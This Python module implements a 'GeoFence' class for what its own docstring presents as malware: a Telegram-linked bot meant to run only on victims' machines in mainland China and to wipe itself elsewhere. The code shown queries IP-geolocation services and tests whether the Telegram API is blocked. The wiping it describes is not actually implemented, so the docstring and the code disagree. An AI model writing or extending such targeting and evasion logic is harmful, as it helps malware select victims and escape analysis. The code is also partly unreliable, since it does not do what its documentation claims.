import requests
import json
import logging
import os
from typing import Optional

class GeoFence:
    """
    G-01: China-only execution logic (Geo-Fencing).
    
    This module ensures that the bot only executes within mainland China (CN) 
    by checking the victim's public IP address against multiple geolocation 
    APIs. If the victim is identified as being outside China, the bot 
    automatically triggers its secure wiping mechanism and terminates.
    """
    
    API_URLS = [
        "http://ip-api.com/json/",
        "https://ipapi.co/json/",
        "https://api.iplocation.net/?ip="
    ]

    @staticmethod
    def get_country_code() -> Optional[str]:
        """Fetch country code from multiple providers for redundancy"""
        for url in GeoFence.API_URLS:
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    # Unified field check (some use 'country' or 'country_code')
                    code = data.get('countryCode') or data.get('country') or data.get('country_code2')
                    if code:
                        return code.upper()
            except Exception as e:
                logging.debug(f"GeoFence: Failed to fetch from {url}: {e}")
        return None

    @staticmethod
    def is_china() -> bool:
        """Check if current location is China (CN)"""
        code = GeoFence.get_country_code()
        # If we can't determine the code, we assume it's NOT China to avoid unnecessary proxying 
        # unless TG is actually blocked.
        return code == "CN"

    @staticmethod
    def is_tg_blocked() -> bool:
        """
        Check if Telegram API is blocked by attempting a direct connection.
        Used for node classification (Bridge vs Blocked).
        """
        tg_url = "https://api.telegram.org/bot" # Base URL
        try:
            # Short timeout to detect blocking early
            response = requests.get(tg_url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
            # We don't care about the 404 (missing token), just that the host is reachable
            return response.status_code not in [200, 404, 401]
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            return True
        except Exception:
            return True

    @classmethod
    def enforce(cls):
        """Standard enforcement check (logging only)"""
        code = GeoFence.get_country_code()
        blocked = cls.is_tg_blocked()
        
        if blocked:
            logging.warning(f"GeoFence: Telegram API is BLOCKED (Location: {code or 'Unknown'})")
        else:
            logging.info(f"GeoFence: Telegram API is Accessible (Location: {code or 'Unknown'})")
            
        return blocked
